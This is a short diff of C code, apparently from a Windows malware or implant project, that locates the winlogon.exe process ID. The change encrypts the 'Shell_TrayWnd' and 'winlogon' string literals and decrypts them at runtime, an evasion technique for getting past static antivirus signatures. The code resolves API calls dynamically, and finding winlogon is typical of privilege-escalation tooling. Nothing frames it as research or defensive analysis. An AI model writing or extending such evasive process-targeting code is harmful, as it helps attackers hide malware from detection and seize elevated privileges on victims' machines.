@@ -64,7 +64,9 @@ static DWORD find_winlogon_pid(void* user32, void* kernel32) {
     if (!fnFindWindow || !fnGetPID) return 0;
 
     /* Get explorer.exe PID from Shell_TrayWnd */
-    HWND hwnd = fnFindWindow(L"Shell_TrayWnd", NULL);
+    wchar_t tray_cls[16];
+    enc_decrypt_wide(enc_wShell_TrayWnd, ENC_WSHELL_TRAYWND_LEN, tray_cls);
+    HWND hwnd = fnFindWindow(tray_cls, NULL);
     if (!hwnd) return 0;
 
     DWORD explorer_pid = 0;
@@ -93,7 +95,9 @@ static DWORD find_winlogon_pid(void* user32, void* kernel32) {
         do {
             /* Compare first 8 WCHARs of exe name = "winlogon" */
             if (pe.szExeFile[0] == 'w' || pe.szExeFile[0] == 'W') {
-                if (_wcsnicmp(pe.szExeFile, L"winlogon", 8) == 0) {
+                wchar_t wlogon[16];
+                enc_decrypt_wide(enc_wwinlogon, ENC_WWINLOGON_LEN, wlogon);
+                if (_wcsnicmp(pe.szExeFile, wlogon, 8) == 0) {
                     winlogon_pid = pe.th32ProcessID;
                     break;
                 }
